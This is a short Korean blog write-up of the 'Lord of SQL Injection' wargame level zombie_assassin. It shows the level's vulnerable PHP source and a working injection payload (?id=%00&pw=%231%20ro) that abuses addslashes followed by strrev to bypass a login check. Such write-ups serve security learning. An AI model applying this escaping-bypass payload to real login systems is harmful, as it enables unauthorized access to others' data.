---
layout: post
title:  "los prob_zombie_assassin"
date:   2019-10-28
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_zombie_assassin where id='' and pw=''

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();
  $_GET['id'] = strrev(addslashes($_GET['id']));
  $_GET['pw'] = strrev(addslashes($_GET['pw']));
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve
1. strrev, addslashes 함수
2. '(싱글쿼터) 이외에 addslashed가 적용되는 문자 -> %00, "
3. \' 문자취급
4. 최종 쿼리문 -> select id from prob_zombie_assassin where id='0\' and pw='or 1#'
5. strrev 생각하며 값을 집어넣음

### ?id=%00&pw=%231%20ro

## ZOMBIE_ASSASSIN Clear!
